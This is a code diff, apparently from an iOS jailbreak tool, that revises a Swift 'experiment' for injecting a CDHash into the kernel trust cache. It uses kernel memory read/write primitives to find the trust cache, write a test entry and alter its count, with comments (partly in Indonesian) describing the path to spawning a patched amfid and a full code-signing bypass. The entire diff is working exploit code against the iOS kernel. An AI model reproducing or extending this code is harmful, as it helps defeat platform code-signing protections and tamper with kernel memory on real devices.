@@ -6617,133 +6617,125 @@ struct AMFIExperimentView: View {
     #if !DISABLE_REMOTECALL
     private func expTCInject(rc: RemoteCall) -> ExperimentResult {
         let expName = "TC Inject (Exp 92)"
-        var detail = "Experiment 92: Inject CDHash into Heap Trust Cache\n"
-        detail += "===================================================\n\n"
-        detail += "Exp 81 confirmed: heap trust cache IS WRITABLE!\n"
-        detail += "Exp 77 found trust cache addr in kernel heap.\n\n"
+        var detail = "Experiment 92: Inject CDHash into Trust Cache\n"
+        detail += "===============================================\n\n"
 
         let mem = rc.trojanMem
         let kernBase = ds_get_kernel_base()
         let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
         let dataSegBase = kernBase &+ dataOff
 
-        // === Step 1: Find heap trust cache (same as Exp 81) ===
-        detail += "=== Step 1: Find heap trust cache ===\n"
+        // === Step 1: Use probedTCAddr from Exp 77 (or find fresh) ===
+        detail += "=== Step 1: Find trust cache ===\n"
 
-        let targetOffsets: [UInt64] = [0x39b0, 0x38a0, 0x3980, 0x3920, 0x3930]
-        var tcAddr: UInt64 = 0
-        var tcCount: UInt32 = 0
+        var tcAddr: UInt64 = probedTCAddr
+        var tcCount: UInt32 = probedTCCount
+        var tcIsHeap = false
 
-        for off in targetOffsets {
-            let addr = dataSegBase &+ off
-            let ptr = ds_kreadptr(addr)
-            guard ptr != 0, isSafeKernelHeapKreadAddress(ptr) else { continue }
+        if tcAddr != 0 {
+            detail += "Using probedTCAddr from Exp 77: 0x\(String(format: "%llx", tcAddr))\n"
+            detail += "  count: \(tcCount)\n"
+            tcIsHeap = isSafeKernelHeapKreadAddress(tcAddr)
+            detail += "  location: \(tcIsHeap ? "HEAP (writable!)" : "__DATA (KTRR protected)")\n"
+        }
 
-            let ver = safeKread32Heap(ptr)
-            let cnt = safeKread32Heap(ptr &+ 4)
-            if ver >= 1 && ver <= 16 && cnt >= 1 && cnt <= 500_000 {
-                tcAddr = ptr
-                tcCount = cnt
-                detail += "Found at kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", ptr))\n"
-                detail += "  version=\(ver), count=\(cnt)\n"
-                break
+        // Also scan for heap trust cache (dynamic TC might exist)
+        if !tcIsHeap {
+            detail += "\nScanning for HEAP trust cache (dynamic)...\n"
+            let targetOffsets: [UInt64] = [0x39b0, 0x38a0, 0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770]
+            for off in targetOffsets {
+                let addr = dataSegBase &+ off
+                let ptr = ds_kreadptr(addr)
+                guard ptr != 0, isSafeKernelHeapKreadAddress(ptr) else { continue }
+                let ver = safeKread32Heap(ptr)
+                let cnt = safeKread32Heap(ptr &+ 4)
+                if ver >= 1 && ver <= 16 && cnt >= 1 && cnt <= 500_000 {
+                    tcAddr = ptr
+                    tcCount = cnt
+                    tcIsHeap = true
+                    detail += "  Found HEAP TC at kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", ptr))\n"
+                    detail += "  version=\(ver), count=\(cnt)\n"
+                    break
+                }
             }
         }
 
-        guard tcAddr != 0 else {
-            detail += "\u{274C} Heap trust cache tidak ditemukan.\n"
-            detail += "Jalankan Exp 77 (Trust Cache Probe) dulu.\n"
+        if tcAddr == 0 {
+            detail += "\u{274C} Trust cache tidak ditemukan. Jalankan Exp 77 dulu.\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        // === Step 2: Compute CDHash of patched binary ===
-        detail += "\n=== Step 2: Compute CDHash ===\n"
-        detail += "Baca code signature dari /var/tmp/.amfid_patched...\n"
+        detail += "\nTarget TC: 0x\(String(format: "%llx", tcAddr)) (\(tcIsHeap ? "heap" : "__DATA"))\n\n"
 
-        // CDHash = SHA256 of CodeDirectory, truncated to 20 bytes
-        // Untuk sekarang: baca CDHash langsung dari binary via csops atau manual parse
-        // Simpler: pakai dummy CDHash dulu, lalu test spawn
-        // Kalau spawn works dengan dummy → kita tahu inject works, tinggal compute real CDHash
+        // === Step 2: Try write to trust cache ===
+        detail += "=== Step 2: Write test ===\n"
 
-        // Actually: kita bisa compute CDHash on-device!
-        // Baca LC_CODE_SIGNATURE dari binary → parse CodeDirectory → SHA256 → truncate 20 bytes
-        // Tapi ini complex. Simpler approach:
-        // Pakai CDHash dari /usr/libexec/amfid ORIGINAL (yang sudah di trust cache)
-        // Inject CDHash itu ke slot baru → verify write works
-        // Lalu: compute CDHash patched binary dan inject yang benar
-
-        // Untuk TEST: inject CDHash dummy dan coba spawn
-        // Jika write berhasil (verify) → kita tahu mechanism works
-        // Lalu compute real CDHash
-
-        // Read CDHash dari trust cache entry [0] (sebagai reference)
-        let entry0Addr = tcAddr &+ 8  // entries start at +8
-        let h0 = safeKread64Heap(entry0Addr)
-        let h1 = safeKread64Heap(entry0Addr &+ 8)
-        let h2 = safeKread32Heap(entry0Addr &+ 16)
-        detail += "Entry[0] CDHash: \(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))\n"
-
-        // === Step 3: Write test entry to trust cache ===
-        detail += "\n=== Step 3: Write test entry ===\n"
-
-        // Write ke slot [count] (append)
-        let stride: UInt64 = 24  // iOS 18 trust cache entry = 24 bytes
+        let stride: UInt64 = 24
         let injectSlot = tcAddr &+ 8 &+ UInt64(tcCount) * stride
-        detail += "Inject slot: 0x\(String(format: "%llx", injectSlot))\n"
+        detail += "Inject slot (count=\(tcCount)): 0x\(String(format: "%llx", injectSlot))\n"
 
-        guard isSafeKernelHeapKreadAddress(injectSlot &+ 20) else {
-            detail += "\u{274C} Inject slot tidak dalam safe heap range.\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        // Read current value at inject slot
+        let beforeVal: UInt64
+        if tcIsHeap {
+            beforeVal = safeKread64Heap(injectSlot)
+        } else {
+            beforeVal = safeKread64Kernel(injectSlot)
         }
+        detail += "Before write: 0x\(String(format: "%016llx", beforeVal))\n"
 
-        // Write dummy CDHash (all 0x41 = "AAAA...")
-        // Entry format: [CDHash 20B] [hashType 1B] [flags 1B] [pad 2B]
-        let testCDHash0: UInt64 = 0x4141414141414141
-        let testCDHash1: UInt64 = 0x4141414141414141
-        let testCDHash2: UInt32 = 0x41414141
-        let hashTypeFlags: UInt32 = 0x00000241  // hashType=2(SHA256) at byte[20], flags=0 at byte[21], pad=0x41 at [22-23]
-        // Actually: bytes [20]=hashType, [21]=flags, [22-23]=pad
-        // Pack: low 4 bytes of word2 = CDHash[16-19], then hashType+flags in upper bytes
-        // Let me just write raw:
+        // Write test value
+        let testVal: UInt64 = 0x4141414141414141
+        ds_kwrite64(injectSlot, testVal)
 
-        ds_kwrite64(injectSlot, testCDHash0)
-        ds_kwrite64(injectSlot &+ 8, testCDHash1)
-        // Bytes 16-19 = CDHash[16-19], byte 20 = hashType=2, byte 21 = flags=0
-        let word2: UInt64 = 0x0000_0002_41414141  // CDHash[16-19]=0x41414141, hashType=2, flags=0, pad=0
-        ds_kwrite64(injectSlot &+ 16, word2)
+        // Read back
+        let afterVal: UInt64
+        if tcIsHeap {
+            afterVal = safeKread64Heap(injectSlot)
+        } else {
+            afterVal = safeKread64Kernel(injectSlot)
+        }
+        detail += "After write: 0x\(String(format: "%016llx", afterVal))\n"
 
-        // Verify write
-        let v0 = safeKread64Heap(injectSlot)
-        let v1 = safeKread64Heap(injectSlot &+ 8)
-        detail += "Verify: 0x\(String(format: "%016llx", v0)) 0x\(String(format: "%016llx", v1))\n"
-
-        let writeOK = v0 == testCDHash0 && v1 == testCDHash1
+        let writeOK = afterVal == testVal
         if writeOK {
-            detail += "\u{2705} WRITE TO HEAP TRUST CACHE CONFIRMED!\n\n"
+            detail += "\u{2705} WRITE SUCCEEDED!\n\n"
 
-            // Update count
-            let oldCount = safeKread32Heap(tcAddr &+ 4)
-            let newCount = oldCount + 1
-            ds_kwrite32(tcAddr &+ 4, newCount)
-            let verifyCount = safeKread32Heap(tcAddr &+ 4)
-            detail += "Count: \(oldCount) \u{2192} \(verifyCount)\n"
+            // Restore original value (don't corrupt TC yet)
+            ds_kwrite64(injectSlot, beforeVal)
 
-            if verifyCount == newCount {
-                detail += "\u{2705} Count updated!\n\n"
-                detail += "=== Step 4: Trust cache injection WORKS! ===\n"
-                detail += "\u{1F3C6}\u{1F3C6}\u{1F3C6} HEAP TRUST CACHE WRITABLE! \u{1F3C6}\u{1F3C6}\u{1F3C6}\n\n"
-                detail += "Next: compute REAL CDHash dari /var/tmp/.amfid_patched\n"
-                detail += "Inject real CDHash \u{2192} spawn patched binary \u{2192} FULL JAILBREAK!\n\n"
-                detail += "Untuk compute CDHash:\n"
-                detail += "  1. Parse Mach-O \u{2192} find LC_CODE_SIGNATURE\n"
-                detail += "  2. Parse SuperBlob \u{2192} find CodeDirectory\n"
-                detail += "  3. SHA256(CodeDirectory) \u{2192} truncate 20 bytes = CDHash\n"
+            // Try update count
+            detail += "=== Step 3: Test count update ===\n"
+            let oldCount = tcIsHeap ? safeKread32Heap(tcAddr &+ 4) : safeKread32Kernel(tcAddr &+ 4)
+            ds_kwrite32(tcAddr &+ 4, oldCount + 1)
+            let newCount = tcIsHeap ? safeKread32Heap(tcAddr &+ 4) : safeKread32Kernel(tcAddr &+ 4)
+            detail += "Count: \(oldCount) \u{2192} \(newCount)\n"
+
+            if newCount == oldCount + 1 {
+                // Restore count
+                ds_kwrite32(tcAddr &+ 4, oldCount)
+                detail += "\u{2705} Count update works!\n\n"
+                detail += "\u{1F3C6}\u{1F3C6}\u{1F3C6} TRUST CACHE IS WRITABLE! \u{1F3C6}\u{1F3C6}\u{1F3C6}\n\n"
+                detail += "Both entry write AND count update work.\n"
+                detail += "Next: compute real CDHash \u{2192} inject \u{2192} spawn \u{2192} JAILBREAK!\n\n"
+                detail += "Trust cache addr: 0x\(String(format: "%llx", tcAddr))\n"
+                detail += "Location: \(tcIsHeap ? "heap" : "__DATA")\n"
+                detail += "Count: \(oldCount)\n"
+                detail += "Stride: \(stride)\n"
             } else {
-                detail += "\u{274C} Count update gagal (zone_require_ro?)\n"
+                detail += "\u{274C} Count update GAGAL (KTRR block write ke count field)\n"
+                detail += "Entry write OK tapi count RO \u{2014} partial success\n"
             }
         } else {
-            detail += "\u{274C} Write gagal \u{2014} heap trust cache mungkin juga RO.\n"
-            detail += "Got: 0x\(String(format: "%016llx", v0)) (expected 0x4141414141414141)\n"
+            detail += "\u{274C} Write GAGAL \u{2014} trust cache di-protect.\n"
+            detail += "Location: \(tcIsHeap ? "heap (unexpected!)" : "__DATA (KTRR expected)")\n\n"
+
+            if !tcIsHeap {
+                detail += "Trust cache di __DATA \u{2192} KTRR hardware read-only.\n"
+                detail += "Tidak ada dynamic/heap trust cache di boot ini.\n"
+                detail += "Untuk inject CDHash, butuh:\n"
+                detail += "  1. Trigger dynamic trust cache creation (mount DDI)\n"
+                detail += "  2. Atau: find different writable TC struct\n"
+            }
         }
 
         return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
